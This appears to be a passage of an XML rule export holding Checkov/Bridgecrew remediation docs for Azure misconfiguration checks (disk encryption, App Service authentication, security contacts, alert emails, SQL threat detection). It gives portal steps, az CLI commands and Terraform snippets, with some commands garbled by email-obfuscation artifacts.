      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-vm-data-disk-is-encrypted-with-the-default-encryption-key-instead-of-adecmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-vm-data-disk-is-encrypted-with-the-default-encryption-key-instead-of-ade-cmk"></div>Azure VM data disk is encrypted with the default encryption key instead of ADE/CMK</div><a aria-label="Skip link to Azure VM data disk is encrypted with the default encryption key instead of ADE/CMK" class="heading-anchor-icon fa fa-anchor" href="#azure-vm-data-disk-is-encrypted-with-the-default-encryption-key-instead-of-adecmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure encrypts data disks by default Server-Side Encryption (SSE) with platform-managed keys [SSE with PMK]. It is recommended to use either SSE with Azure Disk Encryption [SSE with PMK+ADE] or Customer Managed Key [SSE with CMK] which improves on platform-managed keys by giving you control of the encryption keys to meet your compliance need.  Encryption does not impact the performance of managed disks and there is no additional cost for the encryption.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Select the <strong>Management</strong> tab and verify that you have a <strong>Diagnostics Storage Account</strong>. If you have no storage accounts, select <strong>Create New</strong>, give your new account a name, then select <strong>OK</strong>.</li>
<li>When the VM deployment is complete, select <strong>Go to resource</strong>.</li>
<li>On the left-hand sidebar, select <strong>Disks</strong>. On the Disks screen, select <strong>Encryption</strong>.</li>
<li>On the <strong>Create key vault </strong>screen, ensure that the <strong>Resource Group</strong> is the same as the one you used to create the VM.</li>
<li>Name your key vault.</li>
<li>On the <strong>Access Policies</strong> tab, check the <strong>Azure Disk Encryption</strong> for <strong>volume encryption</strong>. </li>
<li>After the key vault has passed validation, select <strong>Create</strong>. Leave the <strong>Key</strong> field blank, then click <strong>Select</strong>.</li>
<li>At the top of the <strong>Encryption</strong> screen, click <strong>Save</strong>. A popup will warn you that the VM will reboot. Click <strong>Yes</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Encrypt your VM with az vm encryption, providing your unique Key Vault name to the --disk-encryption-keyvault parameter.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">az vm encryption enable -g MyResourceGroup --name MyVM --disk-encryption-keyvault myKV

## You can verify that encryption is enabled on your VM with az vm show
az vm show --name MyVM -g MyResourceGroup

## You will see the following in the returned output:
"EncryptionOperation": "EnableEncryption"
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_managed_disk</li>
<li><strong>Argument</strong>: encryption_settings - Is Encryption enabled on this Managed Disk? Changing this forces a new resource to be created.<br/>
Add the encryption_settings block as show:</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">azurerm_managed_disk.example.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="azurerm_managed_disk.example.tf">resource "azurerm_managed_disk" "example" {
  name                 = var.disk_name
  location             = var.location
  resource_group_name  = var.resource_group_name
  storage_account_type = var.storage_account_type
  create_option        = "Empty"
  disk_size_gb         = var.disk_size_gb
 + encryption_settings {
 +   enabled = true
 + }
  tags = var.common_tags
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arm-templates"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arm-templates"></div>ARM Templates</div><a aria-label="Skip link to ARM Templates" class="heading-anchor-icon fa fa-anchor" href="#arm-templates"></a></h2>
<ul>
<li><strong>Resource</strong>: encryptionOperation</li>
<li><strong>Argument</strong>: EnableEncryption</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "parameters": {
    "vmName": {
      "type": "string",
      "metadata": {
        "description": "Name of the virtual machine"
      }
    },
    "volumeType": {
      "type": "string",
      "defaultValue": "Data",
      "allowedValues": [
        "Data"
      ],
      "metadata": {
        "description": "Decryption is supported only on data drives for Linux VMs."
      }
    },
    "sequenceVersion": {
      "type": "string",
      "defaultValue": "1.0",
      "metadata": {
        "description": "Pass in an unique value like a GUID everytime the operation needs to be force run"
      }
    },
    "location": {
      "type": "string",
      "defaultValue": "[resourceGroup().location]",
      "metadata": {
        "description": "Location for all resources."
      }
    }
  },
  "variables": {
    "extensionName": "AzureDiskEncryptionForLinux",
    "extensionVersion": "0.1",
+   "encryptionOperation": "EnableEncryption",
  
  ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_general_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_general_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_general_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_13</key>
    <name>Ensure Azure App Service Web app authentication is On</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-app-service-web-app-authentication-is-off"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-app-service-web-app-authentication-is-off"></div>Azure App Service Web app authentication is Off</div><a aria-label="Skip link to Azure App Service Web app authentication is Off" class="heading-anchor-icon fa fa-anchor" href="#azure-app-service-web-app-authentication-is-off"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure App Service Authentication is a feature that prevents anonymous HTTP requests from reaching the API app. Users with tokens are authenticated before they reach the API app. If an anonymous request is received from a browser, App Service redirects to a logon page. To handle the logon process select from a set of identity providers, or implement a custom authentication mechanism.</p>
<p>Enabling App Service Authentication allows every incoming HTTP request to pass through it before being handled by the application code. Authentication of users with specified providers are handled, for example, Azure Active Directory, Facebook, Google, Microsoft Account, and Twitter. It also handles authentication of validation, storing and refreshing of tokens, managing the authenticated sessions, and injecting identity information into request headers.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>App Services</strong>.</li>
<li>Click each <strong>App</strong>.</li>
<li>Navigate to the <strong>Setting</strong> section, click <strong>Authentication / Authorization</strong>.</li>
<li>Set <strong>App Service Authentication </strong>to <strong>On</strong>.</li>
<li>Select additional parameters as per your requirements. </li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set <strong>App Service Authentication</strong> for an existing app, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az webapp auth update 
--resource-group &lt;RESOURCE_GROUP_NAME&gt; 
--name &lt;APP_NAME&gt; 
--enabled true
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_app_service</li>
<li><strong>Argument</strong>: auth_settings:enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
        ...
+   auth_settings {
+       enabled          = true
    ...
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_general_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_general_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_general_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_20</key>
    <name>Ensure a security contact phone number is present</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="no-security-contact-phone-number-is-present"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-no-security-contact-phone-number-is-present"></div>No security contact phone number is present</div><a aria-label="Skip link to No security contact phone number is present" class="heading-anchor-icon fa fa-anchor" href="#no-security-contact-phone-number-is-present"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Microsoft reaches out to the designated security contact in case its security team finds that the organization's resources are compromised. This ensures that the correct people are aware of any potential compromise and can mitigate the risk in a timely fashion.</p>
<p>We recommend you provide a security contact phone number, but before taking any action make sure that the information provided is valid because the communication is not digitally signed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to the <strong>Security Center</strong>.</li>
<li>Click <strong>Security Policy</strong>.</li>
<li>For the security policy subscription, click <strong>Edit Settings</strong>. </li>
<li>Click <strong>Email notifications</strong>.</li>
<li>Enter a valid security contact <strong>Phone Number</strong>.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set a phone number for contact at time of a potential security breach, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az account get-access-token 
--query "{subscription:subscription,accessToken:accessToken}" 
--out tsv | xargs -L1 bash -c 'curl -X PUT -H "Authorization: Bearer $1" 
-H "Content-Type:application/json"
https://management.azure.com/subscriptions/$0/providers/Microsoft.Security/
securityContacts/default1?api-version=2017-08-01-preview <a class="__cf_email__" data-cfemail="94b9f0d4" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"*input.json*"'
</code></pre>
<p>Where <em>input.json</em> contains the Request body json data, detailed below.<br/>
Replace <em>validEmailAddress</em> with email ids csv for multiple.<br/>
Replace <em>phoneNumber</em> with the valid phone number.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">{   
"id":
"/subscriptions/&lt;Your_Subscription_Id&gt;/providers/Microsoft.Security/
securityContacts/default1",
"name": "default1",
"type": "Microsoft.Security/securityContacts",
"properties": {
"email": "&lt;validEmailAddress&gt;",
"phone": "&lt;phone_number&gt;",
"alertNotifications": "On",
"alertsToAdmins": "On"
}
}
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource</strong>: azurerm_security_center_contact</li>
<li><strong>Argument</strong>: phone</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_contact" "example" {
    email = "<a class="__cf_email__" data-cfemail="395a56574d585a4d795c41585449555c175a5654" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
    phone = "+1-555-555-5555"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_general_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_general_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_general_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_21</key>
    <name>Ensure Send email notification for high severity alerts is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="send-email-notification-for-high-severity-alerts-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-send-email-notification-for-high-severity-alerts-is-not-enabled"></div>Send email notification for high severity alerts is not enabled</div><a aria-label="Skip link to Send email notification for high severity alerts is not enabled" class="heading-anchor-icon fa fa-anchor" href="#send-email-notification-for-high-severity-alerts-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling email security alerts to be automatically sent to your organization's security staff ensures that the correct people are aware of any potential security issues, and can mitigate the risk.</p>
<p>Setting the security alert <strong>Send email notification for high severity alerts</strong> to <strong>On</strong> ensures that emails are sent from Microsoft if their security team determines a potential security breach has taken place. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to the <strong>Security Center</strong>.</li>
<li>Click <strong>Security Policy</strong>.</li>
<li>For the security policy subscription, click <strong>Edit Settings</strong>. </li>
<li>Click <strong>Email notifications</strong>.</li>
<li>Set <strong>Send email notification for high severity alerts</strong> to <strong>On</strong>.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set <strong>Send email notification for high severity alerts</strong> to <strong>On</strong>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az account get-access-token --query
"{subscription:subscription,accessToken:accessToken}" --out tsv | xargs -L1
bash -c 'curl -X PUT -H "Authorization: Bearer $1" -H "Content-Type:application/json"
https://management.azure.com/subscriptions/$0/providers/Microsoft.Security/
securityContacts/default1?api-version=2017-08-01-preview <a class="__cf_email__" data-cfemail="93bef7d3" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"input.json"'
</code></pre>
<p>Where <em>input.json</em> contains the Request body json data, detailed below.<br/>
Replace <em>validEmailAddress</em> with email ids csv for multiple.<br/>
Replace <em>phoneNumber</em> with the valid phone number.</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">{
"id":
"/subscriptions/&lt;Your_Subscription_Id&gt;/providers/Microsoft.Security/
securityContacts/default1",
"name": "default1",
"type": "Microsoft.Security/securityContacts",
"properties": {
"email": "&lt;validEmailAddress&gt;",
"phone": "&lt;phone_number&gt;",
"alertNotifications": "On",
"alertsToAdmins": "On"
}
}
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_security_center_contact</li>
<li><strong>Argument</strong>: alert_notifications</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_contact" "example" {
    ...
+   alert_notifications = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_general_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_general_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_general_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_22</key>
    <name>Ensure Send email notification for high severity alerts to admins is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="send-email-notification-for-high-severity-alerts-to-admins-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-send-email-notification-for-high-severity-alerts-to-admins-is-not-enabled"></div>Send email notification for high severity alerts to admins is not enabled</div><a aria-label="Skip link to Send email notification for high severity alerts to admins is not enabled" class="heading-anchor-icon fa fa-anchor" href="#send-email-notification-for-high-severity-alerts-to-admins-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling security alert emails to subscription owners ensures that they receive security alert emails from Microsoft. This ensures that they are aware of any potential security issues and can mitigate the risk identified in a timely fashion.</p>
<p>We recommend set security alert emails to be sent to subscription owners.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to the <strong>Security Center</strong>.</li>
<li>Click <strong>Security Policy</strong>.</li>
<li>Navigate to <strong>Security Policy Subscription</strong>, click <strong>Edit Settings</strong>. </li>
<li>Click <strong>Email notifications</strong>.</li>
<li>Set <strong>Send email also to subscription owners</strong> to <strong>On</strong>.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set <strong>Send email also to subscription owners</strong> to <strong>On</strong>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az account get-access-token --query
"{subscription:subscription,accessToken:accessToken}" --out tsv | xargs -L1
bash -c 'curl -X PUT -H "Authorization: Bearer $1" -H "Content-Type:
application/json"
https://management.azure.com/subscriptions/$0/providers/Microsoft.Security/se
curityContacts/default1?api-version=2017-08-01-preview <a class="__cf_email__" data-cfemail="0d20694d" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"input.json"'
</code></pre>
<p>Where <strong>input.json</strong> contains the Request body json data, detailed below.<br/>
Replace <strong>validEmailAddress</strong> with email ids csv for multiple.<br/>
Replace <strong>phoneNumber</strong> with a valid phone number.</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name=""> {
 "id":
"/subscriptions/&lt;Your_Subscription_Id&gt;/providers/Microsoft.Security/securityC
ontacts/default1",
 "name": "default1",
 "type": "Microsoft.Security/securityContacts",
 "properties": {
 "email": "&lt;validEmailAddress&gt;",
 "phone": "&lt;phone_number&gt;",
 "alertNotifications": "On",
 "alertsToAdmins": "On"
 }
 }
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_security_center_contact</li>
<li><strong>Argument</strong>: alerts_to_admins</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_contact" "example" {
    ...
+   alerts_to_admins    = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_general_5' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_general_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_general_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_25</key>
    <name>Ensure Azure SQL Server threat detection alerts are enabled for all threat types</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-sql-server-threat-detection-alerts-are-not-enabled-for-all-threat-types"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-sql-server-threat-detection-alerts-are-not-enabled-for-all-threat-types"></div>Azure SQL Server threat detection alerts are not enabled for all threat types</div><a aria-label="Skip link to Azure SQL Server threat detection alerts are not enabled for all threat types" class="heading-anchor-icon fa fa-anchor" href="#azure-sql-server-threat-detection-alerts-are-not-enabled-for-all-threat-types"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling all <strong>Threat Detection Types</strong> protects against SQL injection, database vulnerabilities, and any other anomalous activities. We recommend you enable all types of threat detection on SQL servers.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>SQL servers</strong>.</li>
<li>For each server instance:<br/>
a) Click <strong>Advanced Data Security</strong>.<br/>
b) Navigate to <strong>Threat Detection Settings</strong> section.<br/>
c) Set <strong>Threat Detection Types </strong>to <strong>All</strong>.</li>
</ol>
